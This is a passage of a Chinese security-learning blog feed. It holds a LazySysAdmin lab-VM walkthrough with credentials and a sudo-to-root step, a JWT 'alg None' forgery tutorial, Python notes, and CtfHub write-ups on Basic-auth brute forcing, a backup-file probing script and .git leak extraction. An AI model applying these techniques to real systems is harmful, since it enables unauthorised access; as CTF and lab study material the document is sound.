src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8826%E6%97%A52335_5.png" alt></p><p>得到一个密码12345</p><p>根据上面的wordpress文件发现togie文件发现的用户名</p><p>所以可以尝试ssh连接togie用户</p><pre><code>ssh togie@192.168.204.139</code></pre><p>然后发现登陆成功！</p><p>获取shell！</p><h3 id="6-文件分析-phpmyadmin登录"><a href="#6-文件分析-phpmyadmin登录" class="headerlink" title="6.文件分析-phpmyadmin登录"></a>6.文件分析-phpmyadmin登录</h3><p>### </p><pre><code>root@kali1:~# cd /mntroot@kali1:/mnt# cd wordpress/root@kali1:/mnt/wordpress# lsindex.php        wp-blog-header.php    wp-cron.php        wp-mail.phplicense.txt      wp-comments-post.php  wp-includes        wp-settings.phpreadme.html      wp-config.php         wp-links-opml.php  wp-signup.phpwp-activate.php  wp-config-sample.php  wp-load.php        wp-trackback.phpwp-admin         wp-content            wp-login.php       xmlrpc.phproot@kali1:/mnt/wordpress# vim wp-cwp-comments-post.php  wp-config-sample.php  wp-cron.phpwp-config.php         wp-content/           root@kali1:/mnt/wordpress# vim wp-config.php</code></pre><p>发现：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8826%E6%97%A52348_6.png" alt></p><p>数据库的登陆名字</p><p>Admin</p><p>和密码</p><p>TogieMYSQL12345^^</p><p>然后进入/phpmyadmin利用上述信息进行登陆</p><p>但是却对权限进行了限制！啥也不好使。。</p><h3 id="7-终极目标：系统提权"><a href="#7-终极目标：系统提权" class="headerlink" title="7.终极目标：系统提权"></a>7.终极目标：系统提权</h3><pre><code>togie@LazySysAdmin:~$ sudo su[sudo] password for togie: root@LazySysAdmin:/home/togie# whoamiroot</code></pre><h3 id="8-最后推一下一个大佬的扫除时刻：（此处并未实操）"><a href="#8-最后推一下一个大佬的扫除时刻：（此处并未实操）" class="headerlink" title="8.最后推一下一个大佬的扫除时刻：（此处并未实操）"></a>8.最后推一下一个大佬的扫除时刻：（此处并未实操）</h3><p>URL=<a href="https://blog.csdn.net/qq_38684504/article/details/89703963" target="_blank" rel="noopener">https://blog.csdn.net/qq_38684504/article/details/89703963</a></p><p>然后根据大佬的wp安排自己一个火狐插件</p><p>wappalyzer</p><p>外加另一个很嗨的wp：</p><p><a href="https://blog.csdn.net/weixin_45557138/article/details/108548437" target="_blank" rel="noopener">https://blog.csdn.net/weixin_45557138/article/details/108548437</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JWT验证</title>
      <link href="/2020/12/26/jsonweb-token-yan-zheng/"/>
      <url>/2020/12/26/jsonweb-token-yan-zheng/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p><p>本节课中详细介绍了JSON Web Token（JWT）中的漏洞的利用。在这个程序中，JWT用于认证，登录成功后，用户将获得一个Cookie的JWT。</p><p>JSON Web Token是一种数据的存储机制，主要有加密和签名的安全机制。</p><p>JWT的格式如下：</p><p>Base64(header).Base64(payload).Base64(signature)</p><p>例如：</p><p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6ImFhYWEiLCJpYXQiOiIxNTI1MzQyMDM3In0</p><p>表示</p><p>{“alg”:”HS256”,”typ”:”JWS”}. {“login”:”aaaa”,”iat”:”1525342037”}.网站对数据设计签名机制</p><p>第三部分是一个签名，网上说的很详细了，此处不进行说明。</p><p>具体操作就是：</p><p>然后将编码格式HS256改为None，将用户名改为admin，然后分别进行Base64编码，并把第三部分去掉（注意不要去掉.）</p><p>{“alg”:”None”,”typ”:”JWS”}. {“login”:”admin”,”iat”:”1525342037”}.</p><p>然后分别对{“alg”:”None”,”typ”:”JWS”}</p><p>{“login”:”admin”,”iat”:”1525342037”}</p><p>进行base64加密，然后将bp抓到的token值替换为刚才加密的值</p><p>ok，已经变成admin用户。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
            <tag> json web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爬虫学习</title>
      <link href="/2020/12/24/python-xue-xi/"/>
      <url>/2020/12/24/python-xue-xi/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>1.此处想要输出汉字需要在一开始加一个编码：#coding=utf-8</p><p>2.python最具有特色的就是用缩进来写模块</p><p>3.”””xxx”””这里可以多行print</p><p>4.通过#注释</p><p>5.</p><pre><code>counter = 100#赋值整数型变量miles = 1000.0#赋值浮点型变量name = &quot;iceberg404&quot;#赋值字符串</code></pre><p>6.python五个标准的数据类型：numbers（数字）、string（字符串）、list（列表）、tuple（元组）、dictionary（字典）</p><p>7.</p><pre><code>int 有符号整数型long 长整数（也可以代表八进制和十六进制）float 浮点数complex 复数int（x，[,base]）将x转换为一个整数long（x，[,base]）将x转换为一个长整数float（x，[,base]）将x转换为一个浮点数float（x） 将x转换到一个浮点数str（x） 将对象x转换为字符串tuple（s） 将序列s转换为元组list（s） 将序列s转换为一个列表abs（-10）结果为10#返回数字的绝对值max（x1，x2，x3）#返回给定参数的最大值，参数可以为序列sqrt（x）#返回数字x的平方例：import cmatha=9999999print abs（a）print max （1，2，3，4，5）b=8print cmath.sqrt（b）返回结果：99999995（2.82842712475+0j）&quot;&quot;&quot;当我们在日常生活中编写程序时，我们通常遇到需要使用数学来完成任务的情况。像其他编程语言一样，Python提供了各种基本运算操作，如*代表乘法，%代表求模运算，//代表整除。如果您正在编写一个程序来执行特定任务，如研究周期运动或模拟电路，您将需要使用三角函数以及复数。虽然您不能直接使用这些功能，但您可以先导入两个数学模块来访问它们。这两个模块是math和cmath。第一个模块允许您访问实数的双曲线，三角函数和对数函数，而后者允许您使用复数。&quot;&quot;&quot;</code></pre><p>c+=a等效于c=c+a</p><pre><code>a=20.00b=20if（a is b）  print &quot;a is b&quot;else (a == b)  print &quot;a==b&quot;输出结果为a==b这是is和==之间的区别，此处由于a是浮点数，所以a不等于整数b，故a不是是b，但是a=b。</code></pre><pre><code>flag = Falsename = &#39;ice&#39;if name == &#39;py&#39;:  flag = True  print &#39;1&#39;else:  print name</code></pre><pre><code>count = 0while(count &lt; 5):  print count,&quot;is less than 5&quot;  count += 1else:  print count,&quot;is not less than 5&quot;print &quot;over&quot;</code></pre><h1 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h1><p>正则表达式 Regular Expression, 正则表达式, ⼀种使⽤表达式的⽅式对字符串 进⾏匹配的语法规则. 我们抓取到的⽹⻚源代码本质上就是⼀个超⻓的字符串, 想从⾥⾯提 取内容.⽤正则再合适不过了. 正则的优点: 速度快, 效率⾼, 准确性⾼ 正则的缺点: 新⼿上⼿难度有 点⼉⾼. 不过只要掌握了正则编写的逻辑关系, 写出⼀个提取⻚⾯内容的正则 其实并不复杂 正则的语法: 使⽤元字符进⾏排列组合⽤来匹配字符串 在线测试正 则表达式<a href="https://tool.oschina.net/regex/" target="_blank" rel="noopener">https://tool.oschina.net/regex/</a> </p><p>元字符（默认只匹配一次）: 具有固定含义的特殊符号 常⽤元字符:</p><pre><code>. 匹配除换⾏符以外的任意字符\w 匹配字⺟或数字或下划线\s 匹配任意的空⽩符\d 匹配数字\n 匹配⼀个换⾏符\t 匹配⼀个制表符^ 匹配字符串的开始$ 匹配字符串的结尾\W 匹配⾮字⺟或数字或下划线\D 匹配⾮数字\S 匹配⾮空⽩符a|b 匹配字符a或字符b () 匹配括号内的表达式，也表示⼀个组[...] 匹配字符组中的字符 [^...] 匹配除了字符组中字符的所有字符</code></pre><p>量词: 控制前⾯的元字符出现的次数</p><pre><code>* 重复零次或更多次+ 重复⼀次或更多次? 重复零次或⼀次{n} 重复n次 {n,} 重复n次或更多次{n,m} 重复n到m次 .* 贪婪匹配.*? 惰性匹配</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python笔记</title>
      <link href="/2020/12/24/python-bi-ji/"/>
      <url>/2020/12/24/python-bi-ji/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>1.此处想要输出汉字需要在一开始加一个编码：#coding=utf-8</p><p>2.python最具有特色的就是用缩进来写模块</p><p>3.”””xxx”””这里可以多行print</p><p>4.通过#注释</p><p>5.</p><pre><code>counter = 100#赋值整数型变量miles = 1000.0#赋值浮点型变量name = &quot;iceberg404&quot;#赋值字符串</code></pre><p>6.python五个标准的数据类型：numbers（数字）、string（字符串）、list（列表）、tuple（元组）、dictionary（字典）</p><p>7.</p><pre><code>int 有符号整数型long 长整数（也可以代表八进制和十六进制）float 浮点数complex 复数int（x，[,base]）将x转换为一个整数long（x，[,base]）将x转换为一个长整数float（x，[,base]）将x转换为一个浮点数float（x） 将x转换到一个浮点数str（x） 将对象x转换为字符串tuple（s） 将序列s转换为元组list（s） 将序列s转换为一个列表abs（-10）结果为10#返回数字的绝对值max（x1，x2，x3）#返回给定参数的最大值，参数可以为序列sqrt（x）#返回数字x的平方例：import cmatha=9999999print abs（a）print max （1，2，3，4，5）b=8print cmath.sqrt（b）返回结果：99999995（2.82842712475+0j）&quot;&quot;&quot;当我们在日常生活中编写程序时，我们通常遇到需要使用数学来完成任务的情况。像其他编程语言一样，Python提供了各种基本运算操作，如*代表乘法，%代表求模运算，//代表整除。如果您正在编写一个程序来执行特定任务，如研究周期运动或模拟电路，您将需要使用三角函数以及复数。虽然您不能直接使用这些功能，但您可以先导入两个数学模块来访问它们。这两个模块是math和cmath。第一个模块允许您访问实数的双曲线，三角函数和对数函数，而后者允许您使用复数。&quot;&quot;&quot;</code></pre><p>c+=a等效于c=c+a</p><pre><code>a=20.00b=20if（a is b）  print &quot;a is b&quot;else (a == b)  print &quot;a==b&quot;输出结果为a==b这是is和==之间的区别，此处由于a是浮点数，所以a不等于整数b，故a不是是b，但是a=b。</code></pre><pre><code>flag = Falsename = &#39;ice&#39;if name == &#39;py&#39;:  flag = True  print &#39;1&#39;else:  print name</code></pre><pre><code>count = 0while(count &lt; 5):  print count,&quot;is less than 5&quot;  count += 1else:  print count,&quot;is not less than 5&quot;print &quot;over&quot;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习</title>
      <link href="/2020/12/24/pa-chong-xue-xi/"/>
      <url>/2020/12/24/pa-chong-xue-xi/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>1.此处想要输出汉字需要在一开始加一个编码：#coding=utf-8</p><p>2.python最具有特色的就是用缩进来写模块</p><p>3.”””xxx”””这里可以多行print</p><p>4.通过#注释</p><p>5.</p><pre><code>counter = 100#赋值整数型变量miles = 1000.0#赋值浮点型变量name = &quot;iceberg404&quot;#赋值字符串</code></pre><p>6.python五个标准的数据类型：numbers（数字）、string（字符串）、list（列表）、tuple（元组）、dictionary（字典）</p><p>7.</p><pre><code>int 有符号整数型long 长整数（也可以代表八进制和十六进制）float 浮点数complex 复数int（x，[,base]）将x转换为一个整数long（x，[,base]）将x转换为一个长整数float（x，[,base]）将x转换为一个浮点数float（x） 将x转换到一个浮点数str（x） 将对象x转换为字符串tuple（s） 将序列s转换为元组list（s） 将序列s转换为一个列表abs（-10）结果为10#返回数字的绝对值max（x1，x2，x3）#返回给定参数的最大值，参数可以为序列sqrt（x）#返回数字x的平方例：import cmatha=9999999print abs（a）print max （1，2，3，4，5）b=8print cmath.sqrt（b）返回结果：99999995（2.82842712475+0j）&quot;&quot;&quot;当我们在日常生活中编写程序时，我们通常遇到需要使用数学来完成任务的情况。像其他编程语言一样，Python提供了各种基本运算操作，如*代表乘法，%代表求模运算，//代表整除。如果您正在编写一个程序来执行特定任务，如研究周期运动或模拟电路，您将需要使用三角函数以及复数。虽然您不能直接使用这些功能，但您可以先导入两个数学模块来访问它们。这两个模块是math和cmath。第一个模块允许您访问实数的双曲线，三角函数和对数函数，而后者允许您使用复数。&quot;&quot;&quot;</code></pre><p>c+=a等效于c=c+a</p><pre><code>a=20.00b=20if（a is b）  print &quot;a is b&quot;else (a == b)  print &quot;a==b&quot;输出结果为a==b这是is和==之间的区别，此处由于a是浮点数，所以a不等于整数b，故a不是是b，但是a=b。</code></pre><pre><code>flag = Falsename = &#39;ice&#39;if name == &#39;py&#39;:  flag = True  print &#39;1&#39;else:  print name</code></pre><pre><code>count = 0while(count &lt; 5):  print count,&quot;is less than 5&quot;  count += 1else:  print count,&quot;is not less than 5&quot;print &quot;over&quot;</code></pre><h1 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h1><p>正则表达式 Regular Expression, 正则表达式, ⼀种使⽤表达式的⽅式对字符串 进⾏匹配的语法规则. 我们抓取到的⽹⻚源代码本质上就是⼀个超⻓的字符串, 想从⾥⾯提 取内容.⽤正则再合适不过了. 正则的优点: 速度快, 效率⾼, 准确性⾼ 正则的缺点: 新⼿上⼿难度有 点⼉⾼. 不过只要掌握了正则编写的逻辑关系, 写出⼀个提取⻚⾯内容的正则 其实并不复杂 正则的语法: 使⽤元字符进⾏排列组合⽤来匹配字符串 在线测试正 则表达式<a href="https://tool.oschina.net/regex/" target="_blank" rel="noopener">https://tool.oschina.net/regex/</a> </p><p>元字符（默认只匹配一次）: 具有固定含义的特殊符号 常⽤元字符:</p><pre><code>. 匹配除换⾏符以外的任意字符\w 匹配字⺟或数字或下划线\s 匹配任意的空⽩符\d 匹配数字\n 匹配⼀个换⾏符\t 匹配⼀个制表符^ 匹配字符串的开始$ 匹配字符串的结尾\W 匹配⾮字⺟或数字或下划线\D 匹配⾮数字\S 匹配⾮空⽩符a|b 匹配字符a或字符b () 匹配括号内的表达式，也表示⼀个组[...] 匹配字符组中的字符 [^...] 匹配除了字符组中字符的所有字符</code></pre><p>量词: 控制前⾯的元字符出现的次数</p><pre><code>* 重复零次或更多次+ 重复⼀次或更多次? 重复零次或⼀次{n} 重复n次 {n,} 重复n次或更多次{n,m} 重复n到m次 .* 贪婪匹配.*? 惰性匹配</code></pre><h1 id="Flask学习"><a href="#Flask学习" class="headerlink" title="Flask学习"></a>Flask学习</h1><p>一晚上干会flask!</p><p>web框架-&gt;可以做网站</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CtfHub随笔</title>
      <link href="/2020/12/23/ctfhub-sui-bi/"/>
      <url>/2020/12/23/ctfhub-sui-bi/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Web前置技能"><a href="#Web前置技能" class="headerlink" title="Web前置技能"></a>Web前置技能</h2><h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><h4 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h4><pre><code>题目：HTTP Method is GETUse CTF**B Method, I will give you flag.Hint: If you got 「HTTP Method Not Allowed」 Error, you should request index.php.</code></pre><p>意思就是你是get请求，你把这个请求换成CTFHUB就行</p><p>所以抓包直接一把梭</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51640_1.png" alt></p><h4 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h4><p>题目：</p><pre><code>No Flag here!Give me Flag</code></pre><p>点击发现没有跳转</p><p>二话不说，抓包一把梭了</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51653_2.png" alt></p><p>这里状态码变为了302说明进行了重定向</p><h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><p>直接抓包，本来admin=0，然后给admin赋值=1就行了</p><h4 id="基础认证"><a href="#基础认证" class="headerlink" title="基础认证"></a>基础认证</h4><p>得到提示 do u konw admin ?，于是猜测账号是 admin , 那么接下来就只需要爆破密码了。注意看到 HTTP 请求头部的 Authorization 字段，后面的YWFhOmjiYg==用base64 解码后是 aaa:bbb，也就是我们之前输入的账号:密码。</p><p> 使用 BurpSuite 进行基础认证爆破</p><p>（1）将报文发送到 Intruder, 将 Basic后面 base64部分添加为payload position</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200308145945197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbmF0XzM2NzExMDI1,size_16,color_FFFFFF,t_70" alt="img"></p><p>（2）在 Payloads选项卡下，选择 Payload Type为SimpleList,然后在 Payload Options 中点击 load 加载密码字典</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200308145945221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbmF0XzM2NzExMDI1,size_16,color_FFFFFF,t_70" alt="img"></p><p>（3）Payload Processing -&gt; Add-&gt; Add Prefix（添加前缀）-&gt; 输入 admin:</p><p>  Payload Processing -&gt; Add-&gt; Encode（添加一个编码方式）-&gt; 选择 Base64 Encode</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200308145945348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbmF0XzM2NzExMDI1,size_16,color_FFFFFF,t_70" alt="img"></p><p>（4）Payload Encode 取消勾选的 URL-encode, 不然你会看到base64之后的=会被转成 %3d ，你就算爆破到天荒地老也不会出来</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200308145945375.png" alt="img"></p><p>（5）Start Attack ，然后按 Length 排序，并看到状态码出现200的，即爆破成功</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200308145945389.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200308145945416.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbmF0XzM2NzExMDI1,size_16,color_FFFFFF,t_70" alt="img"></p><p>查看 Response，得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51753_3.png" alt></p><p>有点操作水平。。。。</p><h4 id="响应包源码"><a href="#响应包源码" class="headerlink" title="响应包源码"></a>响应包源码</h4><p>等游戏结束f12查看源码即可</p><h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51433_1.png" alt></p><h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p><a href="http://challenge-62869800fbc1a5d3.sandbox.ctfhub.com:10080/flag_in_here/3/4/flag.txt" target="_blank" rel="noopener">http://challenge-62869800fbc1a5d3.sandbox.ctfhub.com:10080/flag_in_here/3/4/flag.txt</a></p><h3 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h3><p><a href="http://challenge-8833e0a8156bbfbb.sandbox.ctfhub.com:10080/phpinfo.php" target="_blank" rel="noopener">http://challenge-8833e0a8156bbfbb.sandbox.ctfhub.com:10080/phpinfo.php</a></p><p>ctrl+f一把梭</p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//搜狗截图20年12月23日1437_2.png" style="zoom: 80%;"><p>ctfhub{eff7ead587e67aab8af40775}</p><h3 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h3><h4 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h4><p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p><p>可能有点用的提示：</p><pre><code>#### 常见的网站源码备份文件后缀------- tar- tar.gz- zip- rar#### 常见的网站源码备份文件名------- web- website- backup- back- www- wwwroot- temp</code></pre><p><a href="http://challenge-6ede861cbefdfbaf.sandbox.ctfhub.com:10080/www.zip" target="_blank" rel="noopener">http://challenge-6ede861cbefdfbaf.sandbox.ctfhub.com:10080/www.zip</a></p><pre><code>\#!usr/bin/env python#_*_ coding:utf-8 _*_import requests url=&quot;http://challenge-9936840b90db7048.sandbox.ctfhub.com:10080/&quot;list1=[&#39;web&#39;, &#39;website&#39;, &#39;backup&#39;, &#39;back&#39;, &#39;www&#39;, &#39;wwwroot&#39;, &#39;temp&#39;] list2=[&#39;tar&#39;, &#39;tar.gz&#39;, &#39;zip&#39;, &#39;rar&#39;]for i in list1:  for j in list2:         url_f=url+i+&quot;.&quot;+j    r=requests.get(url_f)        if(r.status_code == 200):            print(url_f)</code></pre><p>对没有错，就是通过这个脚本来判断是哪个页面为200</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51522_4.png" alt></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51452_3.png" alt></p><p><a href="http://challenge-6ede861cbefdfbaf.sandbox.ctfhub.com:10080/flag_33916625.txt" target="_blank" rel="noopener">http://challenge-6ede861cbefdfbaf.sandbox.ctfhub.com:10080/flag_33916625.txt</a></p><p>完事！</p><h4 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h4><p>介绍：当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p><p>针对index.php.bak文件</p><p>输入下载完以后改为.txt格式打开直接一把梭</p><h4 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h4><p>介绍：当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。</p><p>.index.php.swp</p><p>这里注意index前面有个点</p><p>然后将swp改为txt打开</p><h4 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h4><p>介绍：.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p><p>下载完以后用.md文件格式打开</p><p>18c26ec34f6edafc85a7cd5e20853f58.txt发现这个文件</p><p><a href="http://challenge-f8108aa66ac9b7ac.sandbox.ctfhub.com:10080/18c26ec34f6edafc85a7cd5e20853f58.txt一把梭" target="_blank" rel="noopener">http://challenge-f8108aa66ac9b7ac.sandbox.ctfhub.com:10080/18c26ec34f6edafc85a7cd5e20853f58.txt一把梭</a></p><h3 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h3><h4 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h4><p>介绍：当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</p><p>先用dirsearch.py进行扫描</p><p>python3 dirsearch.py -u <a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a> -e*</p><pre><code>-u 指定网址 -e 指定网站语言#例如-e php，zip，这里-e*是所有 -t 指定线程 -w 指定字典 -r 递归目录（跑出目录后，继续跑目录下面的目录） --random-agents 使用随机UA(默认在db/uesr-agents.txt中，可以自己添加) -x 排除指定状态码 -s 置请求之间的延时(秒)</code></pre><p>然后用githack脚本跑</p><pre><code>python GitHack.py http://challenge-bf6c3305d834ed77.sandbox.ctfhub.com:10080/.git</code></pre><p>跑完以后去list目录去看看</p><p>进入所下载的文件里面</p><pre><code>git log#使用git log命令查看本地的所有提交</code></pre><p>得：<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51914_4.png" alt></p><pre><code>git reset --hard ea27539d5ad2aa769ee2375400a0a5afc39faab0#彻底回退到某个版本，本地的源码也会变为上一个版本的内容，撤销的commit中所包含的更改被冲掉；lscat 241282368416724.txt</code></pre><p>得到flag</p><h4 id="stash（储藏）"><a href="#stash（储藏）" class="headerlink" title="stash（储藏）"></a>stash（储藏）</h4><p>理解：</p><p>当你要修改或者变更文件的时候，可以通过这个git statsh命令将其暂时保存到一个堆栈中，就好像是写到一半的文件突然不写了，你要去写另一个文件，这样为了避免这个文件消失，你就要用这个命令将他进行一下储存，然后办完手头的事情后，你就可以继续通过存到栈里面的文件继续进行之前未完成的编辑，而这个题目，就是针对查找通过stash命令存到栈里面的文件</p><p>和上一题一样</p><pre><code>git log//查看历史记录git stash poplscat 13456789.txt说明：$git stash                 ／／把本地修改并且未提交的内容，存储到本地栈中的栈顶。$do some work        ／／此时你可以去切换分支或者pull最新代码$git stash pop          ／／此时你可以把你刚才stash到本地栈中的代码pop到本地</code></pre><h4 id="index"><a href="#index" class="headerlink" title="index"></a>index</h4><p>启动githack</p><pre><code>python GitHack.py http://challenge-3aa10bcada98b68b.sandbox.ctfhub.com:10080/.git</code></pre><p>将他的git文件clone到本地然后查看就直接一把</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8811%E6%97%A51208_1.png" alt></p><h3 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h3><p>引子：</p><p>当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</p><h4 id="去网上了解一下svn漏洞："><a href="#去网上了解一下svn漏洞：" class="headerlink" title="去网上了解一下svn漏洞："></a>去网上了解一下svn漏洞：</h4><h5 id="什么是SVN"><a href="#什么是SVN" 